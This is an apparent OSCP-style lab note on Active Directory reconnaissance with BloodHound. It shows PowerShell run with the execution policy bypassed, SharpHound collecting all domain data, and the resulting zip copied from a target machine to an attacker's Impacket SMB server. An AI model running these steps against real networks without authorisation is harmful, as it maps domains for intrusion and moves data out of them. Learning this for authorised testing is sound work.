# Bloodhound

## Latest SharpHound
```bash
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1
```
```bash
## Run it
#Powershell
powershell -ep bypass

# Load Module
Import-Module .\SharpHound.ps1

# BloodHound
Invoke-BloodHound -CollectionMethod All
```
## Transfer File to Kali with Impacket SMB Server
```bash
cd ~/impacket-latest/examples

# Run (ON KALI)
python3 smbserver.py -smb2support test /home/kali/oscp

# Copy File (ON TARGET MACHINE)
copy 20260318174600_BloodHound.zip \\192.168.45.227\test
```

## Start Bloodhound
```bash
sudo neo4j start

# Then Bloodhound
bloodhound
```
![alt text](image-2.png)